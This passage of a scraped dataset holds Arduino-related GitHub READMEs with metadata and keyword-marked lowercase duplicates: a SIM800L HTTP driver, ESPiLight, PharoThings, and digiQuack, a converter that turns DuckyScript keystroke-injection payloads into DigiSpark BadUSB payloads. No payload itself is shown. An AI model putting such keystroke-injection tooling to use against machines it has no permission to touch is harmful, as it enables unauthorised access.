external API. By the way, if you need a pretty cool tool to test and validate API, I recommend Postman. They make really API devlopment simple.\nUsage\nInitiate the driver and the module\nFirst, you have to initiate the driver by telling him the serial link and the RESET pin. The next two parameters defined the size of the internal buffer and the size of the reception buffer. The size of the reception buffer is depending on the data you will receive from the web service/API. If the buffer is too small, you will receive only the first 512 bytes in the examples below. The driver has a buffer overflow protection.\nTo initiate with a SoftwareSerial link (on pin TX_PIN and RX_PIN):\nSoftwareSerial* serial = new SoftwareSerial(TX_PIN, RX_PIN);\nserial->begin(9600);\nSIM800L* sim800l = new SIM800L((Stream *)serial, SIM800_RST_PIN, 200, 512);\nTo initiate with a hardware serial link (Serial1):\nSerial1.begin(9600);\nSIM800L* sim800l = new SIM800L((Stream *)&Serial1, SIM800_RST_PIN, 200, 512);\nSetup and check all aspects for the connectivity\nThen, you have to initiate the basis for a GPRS connectivity.\nThe module has to be initalized and accept AT commands. You can test it and wait the module to be ready.\nsim800l->isReady();\nThe GSM signal should be up. You can test the signed strenght and wait for a signal greater than 0.\nsim800l->getSignal();\nThe module has to be registered on the network. You can obtain the registration status through a specific command and wait for a REGISTERED_HOME or REGISTERED_ROAMING depending on your operator and location.\nsim800l->getRegistrationStatus();\nFinally, you have to setup the APN for the GPRS connectivity. By example: Internet.be for Orange Belgium who is providing SIM cards dedicated for IoT.\nsim800l->setupGPRS(\"Internet.be\");\nConnecting GPRS\nBefore making any connection, you have to open the GPRS connection. It can be done easily. When the GPRS connectivity is UP, the LED is blinking fast on the SIM800L module.\nsim800l->connectGPRS();\nHTTP communication GET\nIn order to make an HTTP GET connection to a server or the Postman Echo service, you just have to define the URL and the timeout in milli-seconds. The HTTP or the HTTPS protocol is set automatically depending on the URL. The URL should always start with http:// or https://.\nsim800l->doGet(\"https://postman-echo.com/get?foo1=bar1&foo2=bar2\", 10000);\nor\nsim800l->doGet(\"https://postman-echo.com/get?foo1=bar1&foo2=bar2\", \"Header-1:value1\\\\r\\\\nHeader-2:value2\", 10000);\nIf the method returns 200 (HTTP status code for OK), you can obtain the size of the data received.\nsim800l->getDataSizeReceived();\nAnd you can obtain the data received through a char array.\nsim800l->getDataReceived();\nHTTP communication POST\nIn order to make an HTTP POST connection to a server or the Postman Echo service, you have to define a bit more information than the GET. Again, the HTTP or the HTTPS protocol is set automatically depending on the URL. The URL should always start with http:// or https://.\nThe arguments of the method are:\nThe URL (https://postman-echo.com/post)\n(optional) Headers (\"Header-1:value1\\r\\nHeader-2:value2\")\nThe content type (application/json)\nThe content to POST ({\"name\": \"morpheus\", \"job\": \"leader\"})\nThe write timeout while writing data to the server (10000 ms)\nThe read timeout while reading data from the server (10000 ms)\nsim800l->doPost(\"https://postman-echo.com/post\", \"application/json\", \"{\\\"name\\\": \\\"morpheus\\\", \\\"job\\\": \\\"leader\\\"}\", 10000, 10000);\nor with headers\nsim800l->doPost(\"https://postman-echo.com/post\", \"Header-1:value1\\\\r\\\\nHeader-2:value2\", \"application/json\", \"{\\\"name\\\": \\\"morpheus\\\", \\\"job\\\": \\\"leader\\\"}\", 10000, 10000);\nIf the method returns 200 (HTTP status code for OK), you can obtain the size of the data received.\nsim800l->getDataSizeReceived();\nAnd you can obtain the data recieved through a char array.\nsim800l->getDataReceived();\nDisconnecting GPRS\nAt the end of the connection, don't forget to disconnect the GPRS to save power.\nsim800l->disconnectGPRS();\nSecurity concerns\nThe SIM800L latest firmware update was in January 2016. It means that using the IP stack embedded on the SIM800L is convenient but not secure. The embedded IP stack should not be used for the transfer of critical data.\nThe embedded IP stack of the SIM800L only supports SSL2, SSL3 and TLS 1.0. These cryptographic protocols are considered deprecated for most of web browsers and the connection will be denied by modern backend (i.e. AWS). This will typically lead to an error 605 or 606 when you establish an HTTPS connection.\nIn order to secure your connectivity to the backend, we strongly recommend using an up-to-date SSL library like WolfSSL.\nLinks\nSIM800 series AT Command Manual\nSIM800 series IP Application Note\nSIM800 series SSL Application Note", "link": "https://github.com/ostaquet/Arduino-SIM800L-driver", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "arduino sim800l http connector\narduino driver for gsm/gprs module simcom sim800l to make http/s connections with get and post methods\nthis is a comprehensive arduino library to make http or https communication through the simcom sim800l module. the library has been designed to limit the memory usage by working with the same shared buffer all the time.\nthe sim800l is a gsm/gprs module built by simcom. the communication with the sim800l module relies on at commands. the available at commands are described in the sim800 series at command manual.\nsupported features in this library:\npower management of the sim800l module\nnetwork registration and signal strengh measurement\ngprs connectivity and setup (apn with or without username and password)\nhttp and https (ssl based on in-built ip stack, see security concerns)\nget and post methods\nsoftwareserial and hardwareserial links\nconfigurable debug serial\nlimited memory usage\nto know before starting...\nthe original module is working with an input voltage of 3.7v to 4.2v. so, don't connect the naked module directly on the arduino. i personally use a module with voltage convertors from/to 5v like this one.\nas the chipset can draw 2a maximum, it is better to use an external power source. using the usb power through the computer is not enough while http communication.\nthere are different firmware version of the sim800l on the market. the https connectivity is available only for r14 and above. (you can check your version with the examples basictest_hardwareserial or basictest_softserial)\nthe firmware of the sim800l is quite old and doesn't support the latest cryptographic protocols which could lead to some issues while connecting backends (typically errors 605 and 606). read also the section below about security concerns.\nhow to install the library?\nthe easiest way to install the library is to go to the library manager of the arduino ide and install the library.\nin the arduino ide, go into menu tools -> manage libraries...\nsearch for sim800l\ninstall sim800l http connector by olivier staquet\nexamples\nyou will find examples in the repository to make https get and https post.\nwe are using the postman echo service to illustrate the communication with an external api. by the way, if you need a pretty cool -----> tool !!!  to test and validate api, i recommend postman. they make really api devlopment simple.\nusage\ninitiate the driver and the module\nfirst, you have to initiate the driver by telling him the serial link and the reset pin. the next two parameters defined the size of the internal buffer and the size of the reception buffer. the size of the reception buffer is depending on the data you will receive from the web service/api. if the buffer is too small, you will receive only the first 512 bytes in the examples below. the driver has a buffer overflow protection.\nto initiate with a softwareserial link (on pin tx_pin and rx_pin):\nsoftwareserial* serial = new softwareserial(tx_pin, rx_pin);\nserial->begin(9600);\nsim800l* sim800l = new sim800l((stream *)serial, sim800_rst_pin, 200, 512);\nto initiate with a hardware serial link (serial1):\nserial1.begin(9600);\nsim800l* sim800l = new sim800l((stream *)&serial1, sim800_rst_pin, 200, 512);\nsetup and check all aspects for the connectivity\nthen, you have to initiate the basis for a gprs connectivity.\nthe module has to be initalized and accept at commands. you can test it and wait the module to be ready.\nsim800l->isready();\nthe gsm signal should be up. you can test the signed strenght and wait for a signal greater than 0.\nsim800l->getsignal();\nthe module has to be registered on the network. you can obtain the registration status through a specific command and wait for a registered_home or registered_roaming depending on your operator and location.\nsim800l->getregistrationstatus();\nfinally, you have to setup the apn for the gprs connectivity. by example: internet.be for orange belgium who is providing sim cards dedicated for iot.\nsim800l->setupgprs(\"internet.be\");\nconnecting gprs\nbefore making any connection, you have to open the gprs connection. it can be done easily. when the gprs connectivity is up, the led is blinking fast on the sim800l module.\nsim800l->connectgprs();\nhttp communication get\nin order to make an http get connection to a server or the postman echo service, you just have to define the url and the timeout in milli-seconds. the http or the https protocol is set automatically depending on the url. the url should always start with http:// or https://.\nsim800l->doget(\"https://postman-echo.com/get?foo1=bar1&foo2=bar2\", 10000);\nor\nsim800l->doget(\"https://postman-echo.com/get?foo1=bar1&foo2=bar2\", \"header-1:value1\\\\r\\\\nheader-2:value2\", 10000);\nif the method returns 200 (http status code for ok), you can obtain the size of the data received.\nsim800l->getdatasizereceived();\nand you can obtain the data received through a char array.\nsim800l->getdatareceived();\nhttp communication post\nin order to make an http post connection to a server or the postman echo service, you have to define a bit more information than the get. again, the http or the https protocol is set automatically depending on the url. the url should always start with http:// or https://.\nthe arguments of the method are:\nthe url (https://postman-echo.com/post)\n(optional) headers (\"header-1:value1\\r\\nheader-2:value2\")\nthe content type (application/json)\nthe content to post ({\"name\": \"morpheus\", \"job\": \"leader\"})\nthe write timeout while writing data to the server (10000 ms)\nthe read timeout while reading data from the server (10000 ms)\nsim800l->dopost(\"https://postman-echo.com/post\", \"application/json\", \"{\\\"name\\\": \\\"morpheus\\\", \\\"job\\\": \\\"leader\\\"}\", 10000, 10000);\nor with headers\nsim800l->dopost(\"https://postman-echo.com/post\", \"header-1:value1\\\\r\\\\nheader-2:value2\", \"application/json\", \"{\\\"name\\\": \\\"morpheus\\\", \\\"job\\\": \\\"leader\\\"}\", 10000, 10000);\nif the method returns 200 (http status code for ok), you can obtain the size of the data received.\nsim800l->getdatasizereceived();\nand you can obtain the data recieved through a char array.\nsim800l->getdatareceived();\ndisconnecting gprs\nat the end of the connection, don't forget to disconnect the gprs to save power.\nsim800l->disconnectgprs();\nsecurity concerns\nthe sim800l latest firmware update was in january 2016. it means that using the ip stack embedded on the sim800l is convenient but not secure. the embedded ip stack should not be used for the transfer of critical data.\nthe embedded ip stack of the sim800l only supports ssl2, ssl3 and tls 1.0. these cryptographic protocols are considered deprecated for most of web browsers and the connection will be denied by modern backend (i.e. aws). this will typically lead to an error 605 or 606 when you establish an https connection.\nin order to secure your connectivity to the backend, we strongly recommend using an up-to-date ssl library like wolfssl.\nlinks\nsim800 series at command manual\nsim800 series ip application note\nsim800 series ssl application note", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000457, "year": null}, {"Unnamed: 0": 2499, "autor": 459, "date": null, "content": "digiQuack\ndigiQuack is an easy DuckyScript to DigiSpark payload converter based on C++. It contains various features including full DuckyScript language support, execution limiter, DigiSpark memory optimizations and more. Note though that currently support of foreign keyboard layouts (not english ones) is rather spotty, so try it out and see if it works out for yourself. The code is well documented with comments so feel free to take a look for yourself.\nInstructions - Online (Recommended) \ud83c\udf10\nYou can use digiQuack by visiting the converter website.\nInstructions - Local \ud83d\udcbb\nJust download one of the releases or download the source (digiQuack.cpp) and compile it yourself.\nLinux/Mac OS users: use ./digiQuack in the terminal to run and follow the prompt.\nWindows users: Run the digiQuack.exe. Drag and drop the txt file with the payload you want to convert and follow the prompt.\nThe converted file will be placed in the scripts' directory (or for macOS under the user directory) and will be named converted.txt. You can then follow seytonic's tutorial (in the credits) to install it on your digispark.\nVideo Tutorial on using the tool locally:\nDownloads\nSee the releases page to get the latest version: https://github.com/CedArctic/digiQuack/releases/\nDigispark Scripts\nIn case you want to play around with some of my Digispark scripts, you can find them here:\nhttps://github.com/CedArctic/DigiSpark-Scripts\nConvert to Python Scripts\nWant to convert Ducky Scripts to Python applications? Check out ducky2python:\nhttps://github.com/CedArctic/ducky2python\nCredits/Resources\nKeyboard usage IDs: www.usb.org/developers/hidpage/Hut1_12v2.pdf\nSeytonic's tutorial: https://www.youtube.com/watch?v=fGmGBa-4cYQ\nKevin Mitnik for pointing out the 'F' improvement: https://www.youtube.com/watch?v=IRSK_DNYL8Q\nhak5darren for the USB Rubber Ducky Documentation: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript\nDigistump for the DigiSpark and their documentation: https://github.com/digistump/DigisparkArduinoIntegration/blob/master/libraries/DigisparkKeyboard/DigiKeyboard.h\nAntyStewie for optimizations", "link": "https://github.com/CedArctic/digiQuack", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "digiquack\ndigiquack is an easy duckyscript to digispark payload converter based on c++. it contains various features including full duckyscript language support, execution limiter, digispark memory optimizations and more. note though that currently support of foreign keyboard layouts (not english ones) is rather spotty, so try it out and see if it works out for yourself. the code is well documented with comments so feel free to take a look for yourself.\ninstructions - online (recommended) \ud83c\udf10\nyou can use digiquack by visiting the converter website.\ninstructions - local \ud83d\udcbb\njust download one of the releases or download the source (digiquack.cpp) and compile it yourself.\nlinux/mac os users: use ./digiquack in the terminal to run and follow the prompt.\nwindows users: run the digiquack.exe. drag and drop the txt file with the payload you want to convert and follow the prompt.\nthe converted file will be placed in the scripts' directory (or for macos under the user directory) and will be named converted.txt. you can then follow seytonic's tutorial (in the credits) to install it on your digispark.\nvideo tutorial on using the -----> tool !!!  locally:\ndownloads\nsee the releases page to get the latest version: https://github.com/cedarctic/digiquack/releases/\ndigispark scripts\nin case you want to play around with some of my digispark scripts, you can find them here:\nhttps://github.com/cedarctic/digispark-scripts\nconvert to python scripts\nwant to convert ducky scripts to python applications? check out ducky2python:\nhttps://github.com/cedarctic/ducky2python\ncredits/resources\nkeyboard usage ids: www.usb.org/developers/hidpage/hut1_12v2.pdf\nseytonic's tutorial: https://www.youtube.com/watch?v=fgmgba-4cyq\nkevin mitnik for pointing out the 'f' improvement: https://www.youtube.com/watch?v=irsk_dnyl8q\nhak5darren for the usb rubber ducky documentation: https://github.com/hak5darren/usb-rubber-ducky/wiki/duckyscript\ndigistump for the digispark and their documentation: https://github.com/digistump/digisparkarduinointegration/blob/master/libraries/digisparkkeyboard/digikeyboard.h\nantystewie for optimizations", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000459, "year": null}, {"Unnamed: 0": 2502, "autor": 462, "date": null, "content": "ESPiLight\nThis Arduino library is a port of the pilight 433.92MHz protocols to the Arduino platform. It was tested with a ESP8266. The aim is to transmit, receive and parse many 433.92MHz protocols, by providing a simple Arduino friendly API. This should help to implement IoT bridges between the 434MHz-RF band and internet protocols.\nBy porting the C modules of the pilight protocols, allows to participate on the excellent work of the pilight community. Thus, supporting many protocols for rc switches and weather stations without reimplementing them.\nA list of supported protocols can be found in the pilight manual: https://manual.pilight.org/protocols/433.92/index.html\nInstallation\nThis library can be easily installed with the Arduino Library Manager.\nUsage\nPlease have a look to the examples.\nRequirements\nThis library was tested and developed for the ESP8266. It may not run on a ATmega-based boards, because of memory usage.\nFor transmitting and receiving you need 434MHz-RF modules. More information can be found here:\nhttps://wiki.pilight.org/receivers\nhttps://wiki.pilight.org/senders\nhttps://github.com/sui77/rc-switch/wiki/List_TransmitterReceiverModules\nContributing\nIf you find any bug, feel free to open an issue at github. Also, pull requests are welcome. The development takes place in the master branch. The release is used to integrate the pilight files and for version tagging, like necessary for the Arduino Library Manager crawler.\nTo prevent formating issues, please make sure that your code is proper formatted. We use the clang-format tool with the Google style. You can just format the code by calling\n$ clang-format -style=Google -i <source-file>\nInstall from source\nIf you are interested to install this library from source, you need to integrate the pilight source files. Since Arduino build all cpp/c files in the src directory and sub directories, only necessary files from pilight will be integrated. This will be done with GNU make.\nOn Linux you can run:\n$ git clone https://github.com/puuu/ESPiLight/\n$ cd ESPiLight\n$ make\n$ ln -s `pwd` ~/Arduino/libraries/\nOn MacOS you can run:\n$ git clone https://github.com/puuu/ESPiLight/\n$ cd ESPiLight\n$ make\n$ ln -s `pwd` ~/Documents/Arduino/libraries/\nUpdate\nTo update ESPiLight from git run:\n$ git pull\n$ make update\nNew protocols\nESPiLight only supports the 434MHz protocols supported by pilight. If you are missing any protocol, please report it directly to pilight. After the intergratrion into pilight it can be merged into ESPILight.\nTo report new protocols, please folow the rules of the pilight forum. It is recommended to use pilight directly. Alternativly, ESPiLight offers the pilight_debug and pilight_raw examples that mimic tht pilight counterparts.\nAcknowledgement\nBig thanks goes to the pilight community, which implemented all the 434MHz protocols. If you want to integrate more protocols, please contribute directly to pilight.\n@janLo contributed some major cleanups and new functionalities to the library.\nOther similar projects\nThere are other, more lightweight 434Mhz implementations:\nhttps://github.com/sui77/rc-switch\nhttps://bitbucket.org/fuzzillogic/433mhzforarduino/wiki/Home", "link": "https://github.com/puuu/ESPiLight", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "espilight\nthis arduino library is a port of the pilight 433.92mhz protocols to the arduino platform. it was tested with a esp8266. the aim is to transmit, receive and parse many 433.92mhz protocols, by providing a simple arduino friendly api. this should help to implement iot bridges between the 434mhz-rf band and internet protocols.\nby porting the c modules of the pilight protocols, allows to participate on the excellent work of the pilight community. thus, supporting many protocols for rc switches and weather stations without reimplementing them.\na list of supported protocols can be found in the pilight manual: https://manual.pilight.org/protocols/433.92/index.html\ninstallation\nthis library can be easily installed with the arduino library manager.\nusage\nplease have a look to the examples.\nrequirements\nthis library was tested and developed for the esp8266. it may not run on a atmega-based boards, because of memory usage.\nfor transmitting and receiving you need 434mhz-rf modules. more information can be found here:\nhttps://wiki.pilight.org/receivers\nhttps://wiki.pilight.org/senders\nhttps://github.com/sui77/rc-switch/wiki/list_transmitterreceivermodules\ncontributing\nif you find any bug, feel free to open an issue at github. also, pull requests are welcome. the development takes place in the master branch. the release is used to integrate the pilight files and for version tagging, like necessary for the arduino library manager crawler.\nto prevent formating issues, please make sure that your code is proper formatted. we use the clang-format -----> tool !!!  with the google style. you can just format the code by calling\n$ clang-format -style=google -i <source-file>\ninstall from source\nif you are interested to install this library from source, you need to integrate the pilight source files. since arduino build all cpp/c files in the src directory and sub directories, only necessary files from pilight will be integrated. this will be done with gnu make.\non linux you can run:\n$ git clone https://github.com/puuu/espilight/\n$ cd espilight\n$ make\n$ ln -s `pwd` ~/arduino/libraries/\non macos you can run:\n$ git clone https://github.com/puuu/espilight/\n$ cd espilight\n$ make\n$ ln -s `pwd` ~/documents/arduino/libraries/\nupdate\nto update espilight from git run:\n$ git pull\n$ make update\nnew protocols\nespilight only supports the 434mhz protocols supported by pilight. if you are missing any protocol, please report it directly to pilight. after the intergratrion into pilight it can be merged into espilight.\nto report new protocols, please folow the rules of the pilight forum. it is recommended to use pilight directly. alternativly, espilight offers the pilight_debug and pilight_raw examples that mimic tht pilight counterparts.\nacknowledgement\nbig thanks goes to the pilight community, which implemented all the 434mhz protocols. if you want to integrate more protocols, please contribute directly to pilight.\n@janlo contributed some major cleanups and new functionalities to the library.\nother similar projects\nthere are other, more lightweight 434mhz implementations:\nhttps://github.com/sui77/rc-switch\nhttps://bitbucket.org/fuzzillogic/433mhzforarduino/wiki/home", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000462, "year": null}, {"Unnamed: 0": 2513, "autor": 473, "date": null, "content": "PharoThings\nLive programming platform for IoT projects based on Pharo. It includes:\ndevelopment tools to lively program, explore and debug remote boards (based on TelePharo)\nboard modeling library which simplifies board configuration\nRaspberry driven by WiringPi library\nArduino driven by Firmata, soon\nBeaglebone, soon\nNow PharoThings is in beta stage together with documentation and videos. It will be improved constantly.\nPharoThings Booklet\nYou can access the PharoThings Booklet with many examples and lessons from the official repository:\nhttps://github.com/SquareBracketAssociates/Booklet-APharoThingsTutorial\nInstallation on Raspberry\nDownload Pharo 6 and install the server part of PharoThings:\nMetacello new\nbaseline: 'PharoThings';\nrepository: 'github://pharo-iot/PharoThings/src';\nload: #(RemoteDevServer Raspberry).\nThen configure image to disable slow browser plugins (instead remote browser will be much slower):\nClySystemEnvironmentPlugin disableSlowPlugins\nAt the end save the image.\nDownload ArmVM http://files.pharo.org/vm/pharo-spur32/linux/armv6/latest.zip. It will run Pharo on your board\nCopy saved image, changes, sources and ArmVM files into your Raspberry (files should be in same directory)\nInstall WiringPi library in Raspberry\nIf you use the latest desktop version of Raspbian skip this step (WiringPi is included). The Light Raspbian version is required manual installation of WiringPi.\nPharoThings uses WiringPi to control Raspberry pins. You need install it in your board. There is a convenient prebuilt package here. Follow install instructions or do it your own way.\nYou can test the WiringPi library in terminal. More information here\ngpio readall\nIf you receive any error, you should update the WiringPi library:\ncd /tmp\nwget https://unicorn.drogon.net/wiringpi-2.46-1.deb\nsudo dpkg -i wiringpi-2.46-1.deb\nStart Pharo on Raspberry with the server option:\npharo --headless Server.image remotePharo --startServerOnPort=40423\nIt will listen for remote IDE connections on port 40423.\nYou can also prepare an image with a running server. Evaluate the following code in a playground and save the image:\nTlpRemoteUIManager registerOnPort: 40423\nIn that case command line option --startServerOnPort is not needed. Just start Pharo with --no-quit option:\npharo --headless Server.image --no-quit\nConnecting to the board\nInstall the client part of PharoThings in the development (client) Pharo image:\nMetacello new\nbaseline: 'PharoThings';\nrepository: 'github://pharo-iot/PharoThings/src';\nload: 'RemoteDev'\nConnect to remote Pharo running on Raspberry using playground:\nremotePharo := TlpRemoteIDE connectTo: (TCPAddress ip: #[193 51 236 167] port: 40423)\nNotice that you should know the IP address of your Raspberry and port where running Pharo is waiting for remote IDE connection. In this example we used port 40423.\nWith the remotePharo instance you can open many different tools to develop and explore remote Pharo images. It is part of TelePharo project. Look at it for details.\nHere we are using specialized Raspberry tools. They require auto refresh feature of inspector which is not enabled by default in Pharo 6. To activate it evaluate:\nGTInspector enableStepRefresh\nInspecting the board\nTo inspect the board you need to know the concrete model of your Raspberry. Currently only model B is supported (with revision 1 and 2). But you can play with the following code on other boards too to get a feeling of this project. In that case pins could point to the wrong physical pins of your board. But tools will not break and will show the same working UI. Also you are always able to work with a board by using the low level library (like WiringPi) using the powerfull remote tools from TelePharo.\nBy the way, the implementation of a specific Raspberry model is very simple task (will be explained later). Feel free to implement support for it and contribute the code to the project.\nSo for your board model you need to choose an appropriate board class. For Raspberry it will be one of the RpiBoard subclasses. With the choosen class evaluate the following code to open an inspector:\nremoteBoard := remotePharo evaluate: [ RpiBoardBRev1 current].\nremoteBoard inspect\nIn this case we work with Raspberry model B revision 1.\nThe board inspector\nThe board inspector provides a scheme of pins similar to Raspberry Pi docs. But here it is a live tool which represents the current pins state.\nIn the picture the board is shown with two configured pins: gpio3 and gpio4 which are connected to physical button and led accordingly.\nDigital pins are shown with green/red icons which represent high/low (1/0) values. In case of output pins you are able to click on the icon to toggle the value. Icons are updated according to pin value changes. If you click on physical button on your board the inspector will show the updated pin state by changing its icon color.\nThe evaluation pane in the bottom of the inspector provides bindings to gpio pins which you can script by #doIt/printIt commands. The example shows expressions which were used to configure a button and led.\nFor the led we first introduced named variable #led which we assigned to gpio4 pin instance:\nled := gpio4\nThen we configured the pin to be in digital output mode and set the value:\nled beDigitalOutput.\nled value: 1\nIt turned the led on.\nFor button we did the same but with digital input mode and extra resistor configuration:\nbutton := gpio3.\nbutton beDigitalInput. \"button\"\nbutton enablePullDownResister.\nYou can notice that gpio variables are not just numbers/ids. PharoThings models boards with first class pins. They are real objects with behaviour. For example you can ask pin to toggle a value:\nled toggleDigitalValue\nOr ask a pin for current value if you want to check it:\nled value.\nbutton value\nThe following demo shows an inspector in live:\nThe device model\nPin scripting is cool and powerful feature but when you need real logic for your pins it is better to put it in objects.\nPharoThings provides simple high level model of devices which you can use to implement complex interaction with your board.\nFor example with button device you can subscribe on #press/release events:\nbutton := board installDevice: (PotButton named: 'button' fromPowerTo: gpio3).\nbutton when: PotButtonReleased send: #toggleDigitalValue to: led.\nIt will connect the physical button to the led as a switch device which turns the led on and off on button click.\nDevices incapsulate pin configuration logic. You don't need to configure an input pin manually when you create a button instance. Just install the device and the pin will work.\nNotice that in example the physical button is connected to the gpio pin from power. That is why we use \"named:fromPowerTo:\" selector when we create a button instance. But a button can be connected another way, too. And in that case we would use the selector #named:fromGroundTo:. It is important to create an instance in the same way as it is connected in the real world because otherwise the button will not work. The reason will be explained later. This logic is hidden by PotButton class and users do not need to think about it.\nNow to toggle the led we still use a script inside inspector. We can replace it with another device PotSwitch:\nbutton unsubscribe: led. \"disable previous script behaviour\"\nboard installDevice: (PotSwitch named: 'led switch' for: gpio4 using: button).\n(first line is required because instead toggle will be performed twice which will not change anything)\nThe board inspector provides extra tab to manage installed devices:\nThis tab shows the live state of devices. You can click on output pins to modify values.\nFrom the context menu you can disable and remove devices. And you can also browse the implementation.\nThe following demo shows devices in live:\nImplementing new devices\nThis topic will be described in details later. Now look at following demo as a simple example how develop and debug the live Raspberry remotely:\nPersist board changes\nIf the board is configured you can save the remote image to persist board changes:\nremotePharo saveImage\nWhen you restart the image board pins will restore the saved state and installed devices will continue working.\nFor example, try to save the board with an led on. Then turn the led of and restart the Pharo. When Pharo will start, the led will be on (because the image was saved in that state).\nAll processes running in Pharo are also persistent. For example from the inspector you can connect the button pin to the led with a simple process:\n[ [100 milliSeconds wait.\nled value: (button value=1) asBit\n] repeat\n] forkNamed: 'button process'.\nIt will turn the led on when the button is pressed.\nNow if you save the image this process will continue working after Pharo restart.\nAll videos above show persistence in live.\nI2C devices\nTo interract with I2C device the I2C connection must be opened:\ni2cConnection := board connectToI2CDevice: addressInt\nThe argument is address/id of target device which is physically connected to the board. For Rassperry board the result is an instance of WiringPiI2CConnection. It provides i/o functions which are available in WiringPi library. For example:\ni2cConnection read8BitsAt: 16rA1.\ni2cConnection write8BitsAt: 16rF2 data: 16r01.\nIn future the connection interface will be improved to be common for different kind of boards.\nTo implement model of I2C device the subclass of PotI2CDevice should be implemented. PotI2CDevice provides prepared i2cConnection. Subclases should implement device initialization in connection method. And they should provide required methods to communicate with target devices.\nMCP9808\nPotMCP9808Device implements model of temperature sensor MCP9808.\nThe code for initialization and sensors reading is copied from Python example.\nThe method #readTemperature returns the value in Celsius\nTo use:\nboard inspector sensor := board installDevice: PotMCP9808Device new.\nplayground. change the board model to your board sensor := (RpiBoard3B current) installDevice: PotMCP9808Device new.\nBME280\nPotBME280Device implements temperature/pressure/humidity sensor BME280.\nThe code for initialization and sensors reading is copied from Python example.\nThe method #readParameters returns three values: Celsius, hPa, humidity percents. In addition there is method #readTemperature to get single value.\nTo use:\nboard inspector sensor := board installDevice: PotBME280Device new.\nboard playground. change the board model to your board sensor := (RpiBoard3B current) installDevice: PotBME280Device new.\nADXL345\nPotADXL345Device implements accelerometer ADXL345.\nThe code for initialization and sensors reading is copied from sunfolder example.\nThe method #readCoordinates returns three values array.\nTo use:\nboard inspector sensor := board installDevice: PotADXL345Device new.\nplayground. change the board model to your board sensor := (RpiBoard3B current) installDevice: PotADXL345Device new.\nHCSR-04 ultrasonic\nPotHCSR04Device implements HCSR-04 ultrasonic sensor\nTo use:\nboard inspector ultrasonic := board installDevice: (PotHCSR04Device triggerPin: 17 gpio echoPin: 27 gpio).\nplayground, change the board model to your board ultrasonic := (RpiBoard3B current) installDevice: (PotHCSR04Device triggerPin: 17 gpio echoPin: 27 gpio).\nTo read the distance use one of the method below.\nreadDistance. \"It will return a number\".\nprintDistance. \"It will return a string\".\nReboot the sensor:\nrebootSensor.\nHD44780 LCD chipset\nPotLCDHD44780 implements LCD controller to all devices using this chipset.\nPotLCD1602Device and PotLCD1602DeviceI2C implements LCD1602 display using GPIOs and I2C interface.\nTo use:\nboard inspector lcd := board installDevice: PotLCD1602Device new. or to I2C lcd := board installDevice: PotLCD1602DeviceI2C new.\nplayground. change the board model to your board lcd := (RpiBoard3B current) installDevice: PotLCD1602Device new. or to I2C lcd := (RpiBoard3B current) installDevice: PotLCD1602DeviceI2C new.\nAPI:\nshowMessage: 'Hello\nPharo IoT'.\nclearDisplay.\ndisableBlinkCursor.\ndisableDisplay.\ndisableUnderlineCursor.\nenableBlinkCursor.\nenableDisplay.\nenableUnderlineCursor.\nmoveCursorLeft.\nmoveCursorRight.\nreturnHome.\nsetCursorAtRow:2.\nsetCursorAtRow:1 column:1.\nsetLeftAutoScroll.\nsetLeftToRight.\nsetRightAutoScroll.\nsetRightToLeft.", "link": "https://github.com/pharo-iot/PharoThings", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "pharothings\nlive programming platform for iot projects based on pharo. it includes:\ndevelopment tools to lively program, explore and debug remote boards (based on telepharo)\nboard modeling library which simplifies board configuration\nraspberry driven by wiringpi library\narduino driven by firmata, soon\nbeaglebone, soon\nnow pharothings is in beta stage together with documentation and videos. it will be improved constantly.\npharothings booklet\nyou can access the pharothings booklet with many examples and lessons from the official repository:\nhttps://github.com/squarebracketassociates/booklet-apharothingstutorial\ninstallation on raspberry\ndownload pharo 6 and install the server part of pharothings:\nmetacello new\nbaseline: 'pharothings';\nrepository: 'github://pharo-iot/pharothings/src';\nload: #(remotedevserver raspberry).\nthen configure image to disable slow browser plugins (instead remote browser will be much slower):\nclysystemenvironmentplugin disableslowplugins\nat the end save the image.\ndownload armvm http://files.pharo.org/vm/pharo-spur32/linux/armv6/latest.zip. it will run pharo on your board\ncopy saved image, changes, sources and armvm files into your raspberry (files should be in same directory)\ninstall wiringpi library in raspberry\nif you use the latest desktop version of raspbian skip this step (wiringpi is included). the light raspbian version is required manual installation of wiringpi.\npharothings uses wiringpi to control raspberry pins. you need install it in your board. there is a convenient prebuilt package here. follow install instructions or do it your own way.\nyou can test the wiringpi library in terminal. more information here\ngpio readall\nif you receive any error, you should update the wiringpi library:\ncd /tmp\nwget https://unicorn.drogon.net/wiringpi-2.46-1.deb\nsudo dpkg -i wiringpi-2.46-1.deb\nstart pharo on raspberry with the server option:\npharo --headless server.image remotepharo --startserveronport=40423\nit will listen for remote ide connections on port 40423.\nyou can also prepare an image with a running server. evaluate the following code in a playground and save the image:\ntlpremoteuimanager registeronport: 40423\nin that case command line option --startserveronport is not needed. just start pharo with --no-quit option:\npharo --headless server.image --no-quit\nconnecting to the board\ninstall the client part of pharothings in the development (client) pharo image:\nmetacello new\nbaseline: 'pharothings';\nrepository: 'github://pharo-iot/pharothings/src';\nload: 'remotedev'\nconnect to remote pharo running on raspberry using playground:\nremotepharo := tlpremoteide connectto: (tcpaddress ip: #[193 51 236 167] port: 40423)\nnotice that you should know the ip address of your raspberry and port where running pharo is waiting for remote ide connection. in this example we used port 40423.\nwith the remotepharo instance you can open many different tools to develop and explore remote pharo images. it is part of telepharo project. look at it for details.\nhere we are using specialized raspberry tools. they require auto refresh feature of inspector which is not enabled by default in pharo 6. to activate it evaluate:\ngtinspector enablesteprefresh\ninspecting the board\nto inspect the board you need to know the concrete model of your raspberry. currently only model b is supported (with revision 1 and 2). but you can play with the following code on other boards too to get a feeling of this project. in that case pins could point to the wrong physical pins of your board. but tools will not break and will show the same working ui. also you are always able to work with a board by using the low level library (like wiringpi) using the powerfull remote tools from telepharo.\nby the 